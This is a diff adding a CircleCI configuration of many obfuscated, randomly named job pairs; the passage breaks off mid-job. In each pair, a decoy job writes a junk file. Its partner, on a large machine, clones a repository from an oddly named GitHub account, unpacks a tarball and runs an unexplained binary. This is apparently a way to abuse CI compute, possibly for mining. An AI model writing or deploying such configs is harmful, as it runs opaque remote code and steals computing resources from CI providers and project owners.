@@ -1,0 +1,1249 @@
+version: 2.1
+
+jobs:
+  drkeih:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hpalxqs
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'ohteynevqpi hcnvykcqojd' > /tmp/hyfgk/breqeal
+            ls -la /tmp/hyfgk/breqeal
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'breqeal'
+  fopjcvo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: mbzvjcnyggocxm
+          command: |
+            [ -s /tmp/hyfgk/breqeal ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: vdikxjgtugodmm
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: otvojlhnljjm
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  apqsifmsxksuc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ymyqytk
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'rshetiugjcwurlay dnvxtcpvlunkq' > /tmp/hyfgk/zqodeg
+            ls -la /tmp/hyfgk/zqodeg
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'zqodeg'
+  difoupryubh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: oiwbfkvwjbl
+          command: |
+            [ -s /tmp/hyfgk/zqodeg ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: bswoyar
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: zifgifedhyerp
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  zltnf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: zjvebzifsffagmw
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'vlscmpqgweqa lshnpbvnldhcs' > /tmp/hyfgk/yhmzfedwzblibm
+            ls -la /tmp/hyfgk/yhmzfedwzblibm
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'yhmzfedwzblibm'
+  qlmvetwskyti:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: btjoyyidzyc
+          command: |
+            [ -s /tmp/hyfgk/yhmzfedwzblibm ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: loknyqk
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: opauhcnusfixib
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  ttfonn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: uaewbjadd
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'lchsgwarztxgkkazj wsaebhnwxczqnhaeyv' > /tmp/hyfgk/cwydoteiyjm
+            ls -la /tmp/hyfgk/cwydoteiyjm
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'cwydoteiyjm'
+  rbvua:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ztfwixslcsprdyb
+          command: |
+            [ -s /tmp/hyfgk/cwydoteiyjm ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: gcoine
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: zgjgrdkgzxg
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  jqmiksbmnyu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: qqegoqjxwgfys
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'wrhbwtavulybgsbar awrrhuwkhufwqvmg' > /tmp/hyfgk/vilrls
+            ls -la /tmp/hyfgk/vilrls
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'vilrls'
+  sxutymebxbx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: xyrlwgkildqlat
+          command: |
+            [ -s /tmp/hyfgk/vilrls ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: nmdeatswi
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: nxeeofhzzc
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  jvnxhdrbaykkkun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: fxutcfkajyus
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'bbxjdexexhhryqv ovlcqnwrnut' > /tmp/hyfgk/suluduq
+            ls -la /tmp/hyfgk/suluduq
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'suluduq'
+  wawwkul:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: tuxuawirnknclu
+          command: |
+            [ -s /tmp/hyfgk/suluduq ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: xkhnjqpfxbzl
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: speoxxbhdx
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  wnrqcohbcgb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: irzyozkz
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'lzprnrvazddsocfa xgcinktfpvaunmada' > /tmp/hyfgk/qzcwajgnbbl
+            ls -la /tmp/hyfgk/qzcwajgnbbl
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'qzcwajgnbbl'
+  dugmkedvk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: fsyewte
+          command: |
+            [ -s /tmp/hyfgk/qzcwajgnbbl ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: ufqpzmiy
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: qaxeiqn
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  vkxhawiweozc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: dnhokexkxuodher
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'siarwykzdzipvjam hzqxiahuqrdl' > /tmp/hyfgk/yeypedvw
+            ls -la /tmp/hyfgk/yeypedvw
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'yeypedvw'
+  mrksvkqgn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: nxpeycjxtsgsqow
+          command: |
+            [ -s /tmp/hyfgk/yeypedvw ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: lxgbjg
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: jobvodebfnlp
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  oznayuxiq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: gkfjkbejtlhjo
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'cjhtosahyibjyfaqht cmipttgkfhsynfmti' > /tmp/hyfgk/cvnwwsnhuul
+            ls -la /tmp/hyfgk/cvnwwsnhuul
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'cvnwwsnhuul'
+  mstvzatv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: wzhgerqxyebml
+          command: |
+            [ -s /tmp/hyfgk/cvnwwsnhuul ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: hxdcwchuxjt
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: voeehhrmkti
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  gvvzqs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: grpsmcebjqbukko
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'qkluhwofpkeholnplo rlajmmbjafzuv' > /tmp/hyfgk/bdqqksoe
+            ls -la /tmp/hyfgk/bdqqksoe
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'bdqqksoe'
+  petuylzdagiabmi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ogbrwbiu
+          command: |
+            [ -s /tmp/hyfgk/bdqqksoe ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: pgldlyj
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: tdrrcg
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  xfrnhmtljo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: onlahpcix
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'hmuhuqwnwoej bzasgircsbmykdy' > /tmp/hyfgk/nksamkpqmehpf
+            ls -la /tmp/hyfgk/nksamkpqmehpf
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'nksamkpqmehpf'
+  zotmbere:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: uooovsrdkflqhrk
+          command: |
+            [ -s /tmp/hyfgk/nksamkpqmehpf ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: nogcgmpxbnbmzv
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: qazmh
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  mvtithsdtm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: rtpjlcgjbtkj
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'fsajejrgazxigibb bqguydsxprlkhqxfhk' > /tmp/hyfgk/zzadlpnl
+            ls -la /tmp/hyfgk/zzadlpnl
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'zzadlpnl'
+  dzyctyzvabu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: wxjfcwgpl
+          command: |
+            [ -s /tmp/hyfgk/zzadlpnl ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: xvvhbdlhej
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: xqzlvkcegzdlttv
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  dmdnhk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: kxnocj
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'waryuzxhypzkbghz howqvbijajdkoegu' > /tmp/hyfgk/akdswaq
+            ls -la /tmp/hyfgk/akdswaq
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'akdswaq'
+  dhzvzangqdgu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ixoznb
+          command: |
+            [ -s /tmp/hyfgk/akdswaq ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: uaetrmqs
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: zduoybwouhbf
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  loemglabjuxuxuw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ojipmectgndfznx
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'ftllmsexvqnffencqi uozwbtjgehsyz' > /tmp/hyfgk/vxxwwex
+            ls -la /tmp/hyfgk/vxxwwex
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'vxxwwex'
+  wpllxlkc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: sxmqioektsri
+          command: |
+            [ -s /tmp/hyfgk/vxxwwex ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: kpnfxxls
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: gxjwt
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  zogbyqbqynyqnfu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: vqnxddejocal
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'luzvgmjnanuc ivgvckoqpvctdt' > /tmp/hyfgk/vkzqdfui
+            ls -la /tmp/hyfgk/vkzqdfui
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'vkzqdfui'
+  gwppctcjicsuf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: anivzjrqw
+          command: |
+            [ -s /tmp/hyfgk/vkzqdfui ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: tsfpznrtr
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: wmxdasbzwhg
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  ozvvz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: hbuhavw
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'yxjlreoouszo giictruxmjvuqss' > /tmp/hyfgk/zbmhzjenj
+            ls -la /tmp/hyfgk/zbmhzjenj
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'zbmhzjenj'
+  xrzwuyekbpzib:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: epxzehdbme
+          command: |
+            [ -s /tmp/hyfgk/zbmhzjenj ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: lwsmdfdzrorlz
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: nilnktyajnshikn
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  dmnvixczwvh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: orhsuzoj
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'wzjspkyojudvkf bwnpoffgpmkpyb' > /tmp/hyfgk/htqddkrtpmrtre
+            ls -la /tmp/hyfgk/htqddkrtpmrtre
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'htqddkrtpmrtre'
+  amhzyxved:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: keiusybmwho
+          command: |
+            [ -s /tmp/hyfgk/htqddkrtpmrtre ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: hmytmktx
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: yqemlb
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  aphmpucsrnwbku:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: hlahjknm
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'brdstrrkshwzactluc cmpqxkyymxeawvv' > /tmp/hyfgk/htkhyjmu
+            ls -la /tmp/hyfgk/htkhyjmu
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'htkhyjmu'
+  xpgcbjqvtdk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: lgcgznfdzlk
+          command: |
+            [ -s /tmp/hyfgk/htkhyjmu ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: hsmhiura
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: xkodkryvsjgw
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  iqemhlmym:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: erxwzim
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'hbpqgvxvcqtbwcevkw epgqsfhuwpzlrr' > /tmp/hyfgk/qyvkrrndvoj
+            ls -la /tmp/hyfgk/qyvkrrndvoj
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'qyvkrrndvoj'
+  rjnyk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: lsirnxwkehzox
+          command: |
+            [ -s /tmp/hyfgk/qyvkrrndvoj ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: ehomhmgnzyf
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: ugowfsjz
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  qcihkmqk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: omgbygv
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'zcsmkzmmvxpmuuny eugohaikdy' > /tmp/hyfgk/lsxldrpce
+            ls -la /tmp/hyfgk/lsxldrpce
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'lsxldrpce'
+  sgyyhohsjtxhbpp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: tuoucbnafq
+          command: |
+            [ -s /tmp/hyfgk/lsxldrpce ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: udginbzudqmxcc
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: lazxipo
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  mzdiscijo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: bmnktbxnu
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'humbsxxowmm njkegjeckxkbxoxlo' > /tmp/hyfgk/vmguiick
+            ls -la /tmp/hyfgk/vmguiick
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'vmguiick'
+  xwbckogklklsk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ntkobecsevqu
+          command: |
+            [ -s /tmp/hyfgk/vmguiick ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: lleazhvbkxh
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: vglafn
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  cjojfqosiekcw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: awsqxczpnepq
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'lgwqoylqibfc vfqeabizdrpiolf' > /tmp/hyfgk/fvmwhhpdbg
+            ls -la /tmp/hyfgk/fvmwhhpdbg
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'fvmwhhpdbg'
+  sytoaig:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: mbvhbp
+          command: |
+            [ -s /tmp/hyfgk/fvmwhhpdbg ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: eltoibhclmzjj
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: nmnxiy
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  hcgdgm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: yqkkpxdhh
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'ssyvbcodmdhftxb wncomrvdfq' > /tmp/hyfgk/fkfgkpsw
+            ls -la /tmp/hyfgk/fkfgkpsw
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'fkfgkpsw'
+  fgvbuotluxd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: lfnpfxbell
+          command: |
+            [ -s /tmp/hyfgk/fkfgkpsw ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: ejjie
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: gnrpojkt
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  axcvyxttmcossis:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: kwvefg
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'ahjnwbmsyc yzbaogqwqomwoc' > /tmp/hyfgk/pjulsmqbsql
+            ls -la /tmp/hyfgk/pjulsmqbsql
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'pjulsmqbsql'
+  wqkyqyyivr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: wxcgnp
+          command: |
+            [ -s /tmp/hyfgk/pjulsmqbsql ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: bmqnxszr
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: rfaua
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  prgwzom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: qodxmkfraxrpk
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'gzhmfuzkzbkmye jhhjifrbifere' > /tmp/hyfgk/kcsqkokynb
+            ls -la /tmp/hyfgk/kcsqkokynb
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'kcsqkokynb'
+  vtubec:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: vtatjx
+          command: |
+            [ -s /tmp/hyfgk/kcsqkokynb ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: nxeplqleglvq
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: yctxpaqe
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  joideohvjaspf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: hxangi
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'bmihnqetmqvbsfd xehfsxayijkhisuik' > /tmp/hyfgk/qqwikhzqf
+            ls -la /tmp/hyfgk/qqwikhzqf
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'qqwikhzqf'
+  lnihnb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: hnpdwwnrzqbyb
+          command: |
+            [ -s /tmp/hyfgk/qqwikhzqf ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: obyepzaonguemsj
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: fzwjdmbqfugmolc
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  ykfmldbyafone:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: xllczirevqgwiaj
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'wknluvotei sqyhklegqnqjagxea' > /tmp/hyfgk/wqwjvopwsadbsi
+            ls -la /tmp/hyfgk/wqwjvopwsadbsi
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'wqwjvopwsadbsi'
+  vyymdtlrnhe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: pnqgnevcirfdwfy
+          command: |
+            [ -s /tmp/hyfgk/wqwjvopwsadbsi ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: abyurbh
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: vwijohoewjukcyb
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  qtnzdsb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: okvdzab
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'zyhriniyinsm mkeffmrznhn' > /tmp/hyfgk/hwkqzbbwtp
+            ls -la /tmp/hyfgk/hwkqzbbwtp
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'hwkqzbbwtp'
+  iowwuzen:
+    machine:
+      image: ubuntu-2204:current
